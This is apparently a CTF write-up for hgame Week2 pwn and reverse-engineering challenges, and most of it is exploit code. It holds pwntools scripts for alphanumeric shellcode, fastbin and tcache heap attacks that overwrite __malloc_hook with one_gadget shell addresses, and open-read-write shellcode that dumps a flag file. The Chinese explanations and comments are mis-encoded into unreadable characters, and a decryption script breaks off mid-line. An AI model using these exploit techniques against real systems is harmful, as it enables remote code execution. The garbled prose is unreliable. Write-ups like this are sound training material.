<p>alphanumeric shellcode <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ae64 import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:30657&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">io.sendlineafter(&#x27;input the length of your shellcode:&#x27;,str(-1))</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = AE64().encode(payload,&#x27;rax&#x27;,0,&#x27;small&#x27;)</span><br><span class="line">print(payload.decode(&#x27;latin-1&#x27;))</span><br><span class="line">io.sendafter(&#x27;input your shellcode:&#x27;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="week2">Week2</h1>
<h2 id="pwn---ak">Pwn - AK</h2>
<h3 id="fastnote">fastnote</h3>
<p>libc-2.31ï¼Œå¡«æ»¡ tcachebin çš„ unsortedbin leak + fastbin attack
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;47.102.130.35:31898&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload = &#x27;A&#x27;*4</span><br><span class="line">for i in range(8):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0-6 tcachebin, chunk7: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(8,0x10,payload) # é˜²annex</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">   free(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0-6 tcachebin</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27;*7</span><br><span class="line">alloc(7,0x08,payload) # å› ä¸º read å‡½æ•°è²Œä¼¼ä¼šæŠŠ chunk å†…éƒ¨ç”¨ &#x27;\x00&#x27; å¡«æ»¡ï¼Œæ‰€ä»¥åªç”³è¯·0x08ï¼Œå¯ä»¥ç•™ä¸‹ bk é‡Œçš„ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - 0x80 - 0x60</span><br><span class="line">main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print(&quot;main_arena   ---&gt;   &quot;,hex(main_arena))</span><br><span class="line">print(&quot;main_arena_offset   ---&gt;   &quot;,hex(main_arena_offset))</span><br><span class="line">print(&quot;libc_base    ---&gt;   &quot;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">alloc(0,0x60,payload) # ç”³è¯· unsortedbin é‡Œé¢çš„ chunkï¼Œä¾¿äºåé¢ alloc</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*8</span><br><span class="line">for i in range(9):</span><br><span class="line">  alloc(i,0x10,payload) # chunk0-6:&quot;7 tcachebin chunks&quot;  || chunk7,8:&quot;fastbin chunk&quot;</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">  free(i) # free(0-6) free(7,8)</span><br><span class="line"></span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io) # state1</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">  alloc(i,0x10,payload) # chunk0-6: æ¸…ç©ºtcachebin</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&quot;malloc_addr    ---&gt;   &quot;,hex(malloc_addr))</span><br><span class="line">payload = p64(malloc_addr)</span><br><span class="line">alloc(7,0x10,payload) # chunk7: åŠ«æŒç”±fastbinç”Ÿæˆçš„tcachebiné“¾</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(7))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">alloc(8,0x10,payload) # chunk8: chunk8</span><br><span class="line">one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]</span><br><span class="line">payload = p64(libc_base + one_gadget[1])</span><br><span class="line">alloc(9,0x10,payload) # chunk9: Any Address</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line"># alloc(10,0x10,payload) # getshell</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="old_fastnote">old_fastnote</h3>
<p>libc-2.23ï¼Œunsortedbin leak + fastbin attackï¼Œæ³¨æ„ fastbin chunk çš„
size åŸŸæ„é€ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:32449&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload = &#x27;A&#x27;*4</span><br><span class="line">for i in range(1):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(1,0x10,payload) # chunk1 é˜²annex</span><br><span class="line"></span><br><span class="line">for i in range(1):</span><br><span class="line">   free(i)</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27;*7</span><br><span class="line">alloc(0,0x08,payload) # å› ä¸º read å‡½æ•°è²Œä¼¼ä¼šæŠŠ chunk å†…éƒ¨ç”¨ &#x27;\x00&#x27; å¡«æ»¡ï¼Œæ‰€ä»¥åªç”³è¯·0x08ï¼Œå¯ä»¥ç•™ä¸‹ bk é‡Œçš„ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">main_arena = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - 0x80 - 88</span><br><span class="line">main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print(&quot;main_arena   ---&gt;   &quot;,hex(main_arena))</span><br><span class="line">print(&quot;main_arena_offset   ---&gt;   &quot;,hex(main_arena_offset))</span><br><span class="line">print(&quot;libc_base    ---&gt;   &quot;,hex(libc_base))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(0,0x60,payload) # ç”³è¯· unsortedbin é‡Œé¢çš„ chunkï¼Œä¾¿äºåé¢ alloc</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*8</span><br><span class="line">for i in range(2):</span><br><span class="line">  alloc(i,0x60,payload) # chunk0,1:&quot;fastbin chunk&quot;</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">  free(i) # free(0,1)</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io) # state1</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0xb - 0x18</span><br><span class="line">print(&quot;malloc_addr    ---&gt;   &quot;,hex(malloc_addr))</span><br><span class="line">payload = p64(malloc_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(7))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">alloc(8,0x60,payload) # chunk8: chunk8</span><br><span class="line">alloc(9,0x60,payload) # chunk9: Any Address</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">payload = b&#x27;\x00&#x27;*19 + payload</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="eldenring2">eldenRing2</h3>
<p>å¿…é¡» patch æ‰èƒ½è¿è¡Œ vulnï¼Œç”¨ç»™çš„ libc.so.6 æµ‹è¯•å‡ºæ¥æ˜¯ libc-2.31ã€‚</p>
<p>åšæ³•è·Ÿ fastnote ä¸€æ ·ï¼Œå¡«æ»¡ tcachebin çš„unsortedbin leak + fastbin
attack</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:32672&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(ip[0],int(ip[1]))</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1)) </span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index)) # æœ€å¤š16ä¸ªidxï¼Œä¸èƒ½é‡å¤ä½¿ç”¨</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))   # æœ€å¤§0xFF -&gt; 0x100</span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index)) # å¯ä»¥ UAF</span><br><span class="line">  </span><br><span class="line">def edit(Index,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">for i in range(8):</span><br><span class="line">  alloc(i,0x80)        # chunk0-6: tcachebin; chunk7: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(8,0x10)          # chunk8: é˜² annex</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">  free(i)</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena = u64(io.recvuntil(&#x27;\x7f&#x27;).ljust(8,b&#x27;\x00&#x27;)) - 0x60</span><br><span class="line">print(&#x27;main_arena       ---&gt;   &#x27;,hex(main_arena))</span><br><span class="line">libc_base = main_arena - 0x1ECB80</span><br><span class="line">print(&#x27;libc_base        ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;__malloc_hook    ---&gt;   &#x27;,hex(__malloc_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook)</span><br><span class="line">edit(6,payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(9,0x80)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(10,0x80)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]</span><br><span class="line">for i in range(len(one_gadget)):</span><br><span class="line">  one_gadget[i] += libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget[1])</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1)) </span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(11)) </span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))   </span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="shellcodemaster">ShellcodeMaster</h3>
<p>è¿™é¢˜å¡äº†æœ€ä¹…...è§‚å¯Ÿç¨‹åº context ç„¶åç ”ç©¶æ€ä¹ˆå‹ç¼©
shellcodeï¼Œæ•´äº†è€åŠå¤©</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:31224&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(ip[0],int(ip[1]))</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">code = &#x27;&#x27;&#x27;</span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">mov al, 10</span><br><span class="line">xchg rdi, r15</span><br><span class="line">mov dl, 7</span><br><span class="line">syscall</span><br><span class="line">xor eax, eax</span><br><span class="line">xchg esi, edi</span><br><span class="line">xor edi, edi</span><br><span class="line">xchg edx, ebx</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode1 = &#x27;&#x27;&#x27;</span><br><span class="line">mov rdi,0x2333008</span><br><span class="line">xor esi,esi</span><br><span class="line">mov rax,2</span><br><span class="line">syscall</span><br><span class="line">xor edx,edx</span><br><span class="line">mov rdi,3</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov esi,0x2333100</span><br><span class="line">mov rax,0</span><br><span class="line">syscall</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov esi,0x2333100</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload1 = asm(shellcode1)</span><br><span class="line"></span><br><span class="line">shellcode=asm(code)</span><br><span class="line">print(len(shellcode))</span><br><span class="line">payload = b&#x27;\x90&#x27;*(len(shellcode)-14) + b&#x27;flag\x00\x00\x00\x00&#x27; + b&#x27;\x90&#x27;*8 + payload1</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;n 27&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendafter(&#x27;bytes shellcode\n\n&#x27;,shellcode)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rev---24">Rev - 2/4</h2>
<h3 id="ezcpp">ezcpp</h3>
<p>è¿™é¢˜è¯» cpp çš„éƒ¨åˆ†ç›¸å½“ç®€å•ï¼Œæ ¸å¿ƒåŠ å¯†éƒ¨åˆ†ç”¨çš„ Teaï¼Œä¸è¿‡é­”æ”¹äº†åŠ å¯†çš„
blockï¼ŒåªåŠ å¯†äº†å‰12bytesï¼Œè¿˜é­”æ”¹äº†åŠ å¯†å‰ 8bytes æ—¶çš„ delta.</p>
<h3 id="babyre">babyre</h3>
<p>å¤šçº¿ç¨‹å¤„ç†ï¼Œä¸è¿‡æ¯ä¸€æ¬¡åŠ å¯†éƒ½æ˜¯åŸå­çš„ï¼Œidxæ˜¯å…¨å±€å˜é‡ï¼Œç­‰å‰ä¸€ä¸ªthreadé‡Šæ”¾ä»¥åä¸‹ä¸€ä¸ªthreadæ‰èƒ½å¤„ç†ï¼Œæ‰€ä»¥æ•°ç»„æ¯ä¸€ä¸ªå…ƒç´ éƒ½è¢«åŠ å¯†ä¸€æ¬¡ï¼Œæ•´ä¸ªç¨‹åºä½¿ç”¨ç±»ä¼¼äº
ECB çš„æ–¹å¼åŠ å¯†ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨æœ€åä¸€ä½ä¹Ÿå°±æ˜¯è—åœ¨ flag åé¢çš„çš„ flag[33]
æ¥ä¸€ä½ä¸€ä½çš„å‘å‰è§£å¯†</p>
<p>ä½†è¿™é¢˜æ¯”è¾ƒæ¶å¿ƒçš„ç‚¹å°±æ˜¯ï¼Œè§¦å‘ SIGFPE
ä¼šflag[33]++ï¼Œåœ¨åŠ å¯†flag[32]ä¹Ÿå°±æ˜¯<code>&#125;</code>è¿™ä¸ªå­—ç¬¦æ—¶æœ‰ä¸€å®šçš„å˜åŒ–</p>
<p>å…¶æ¬¡ï¼Œè§¦å‘ SIGFPE è¿˜ä¼šè®© 'feifei' è¿™ä¸ª key å†è¢« <code>xor 0x11</code>
ä¸€è½®ï¼Œæ‰€ä»¥ä¸­é—´çš„ key å€¼ä¼šæ›´æ”¹å¥½å‡ æ¬¡ï¼Œæˆ‘ä»¬è¿˜æ²¡åŠæ³•å…·ä½“é¢„æµ‹å“ªé‡Œè§¦å‘äº†
SIGFPE ã€‚</p>
<p>ä½†æ ¹æ® flag çš„å‰å‡ ä½ä¸º<code>hgame&#123;</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ try-except
æ¥ä»å‰å‘åè§£å¯†ï¼Œå¦‚æœå‘ç°å‡ºç°çš„å­—ç¬¦ä¸å¯¹ï¼Œæˆ–è€…æŠ›å‡ºå¼‚å¸¸ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šåŸç¨‹åºè¿™é‡Œè§¦å‘äº†
SIGFPEï¼Œæˆ‘ä»¬å°±è‡ªè¡Œå¯¹ key å€¼ xorï¼Œè¿™æ ·åˆ°æœ€åä¹Ÿä¸ç”¨ç®¡ flag[33] äº†</p>
<p>python å¤„ç†å¯èƒ½ä¼šæº¢å‡ºçš„æ•°æ®ä¸€å®šè¦è®°å¾— &amp; 0x..FF å–ä½ä½å­—èŠ‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">encflag = [<span class="number">0x00002F14</span>, <span class="number">0x0000004E</span>, <span class="number">0x00004FF3</span>, <span class="number">0x0000006D</span>, <span class="number">0x000032D8</span>, <span class="number">0x0000006D</span>, <span class="number">0x00006B4B</span>, <span class="number">0xFFFFFF92</span>, <span class="number">0x0000264F</span>, <span class="number">0x0000005B</span>, <span class="number">0x000052FB</span>, <span class="number">0xFFFFFF9C</span>, <span class="number">0x00002B71</span>, <span class="number">0x00000014</span>, <span class="number">0x00002A6F</span>, <span class="number">0xFFFFFF95</span>, <span class="number">0x000028FA</span>, <span class="number">0x0000001D</span>, <span class="number">0x00002989</span>, <span class="number">0xFFFFFF9B</span>, <span class="number">0x000028B4</span>, <span class="number">0x0000004E</span>, <span class="number">0x00004506</span>, <span class="number">0xFFFFFFDA</span>, <span class="number">0x0000177B</span>, <span class="number">0xFFFFFFFC</span>, <span class="number">0x000040CE</span>, <span class="number">0x0000007D</span>, <span class="number">0x000029E3</span>, <span class="number">0x0000000F</span>, <span class="number">0x00001F11</span>, <span class="number">0x000000FF</span>,<span class="number">0xFa</span>]</span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;yo23412341234123412341234&#125;&#x27;</span></span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;wtxwtx&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">ord</span>(flag[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] = <span class="built_in">ord</span>(key[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exc = [<span class="number">8</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">17</span>,<span class="number">20</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">29</span>] <span class="comment"># è§‚å¯Ÿè§„å¾‹å¯çŸ¥ exception_point = [x for x in range(8,30,3)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> exc:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            key[j] = key[j] ^ <span class="number">0x11</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = (encflag[i] - flag[i]) // key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = ((flag[i] - encflag[i]) &amp; <span class="number">0xFFFFFFFF</span>) ^ key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = (encflag[i] // flag[i]) - key[(i+<span class="number">1</span>)%<span 